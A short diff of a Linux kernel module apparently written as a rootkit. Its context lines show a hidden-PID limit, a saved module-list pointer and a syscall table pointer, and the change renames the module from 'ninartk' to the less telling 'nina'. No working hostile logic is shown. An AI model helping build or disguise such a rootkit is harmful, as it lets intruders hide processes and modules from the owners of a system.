@@ -10,10 +10,11 @@
 #include <linux/fs.h>
 #include <linux/slab.h>     /* kmalloc */
 #include <linux/signal.h>
+#include <linux/sched.h>
 
 MODULE_LICENSE("GPL");
 
-#define MODULE_NAME "ninartk"
+#define MODULE_NAME "nina"
 #define MAX_HIDDEN_PIDS 5
 #define MAX_PID_LENGTH 6
 
@@ -39,8 +40,6 @@ static struct list_head *module_kobj_previous;
 
 static int temp;
 static char desc[50];
-
-static char nina_pid[10];
 
 unsigned long* syscall_table;
 
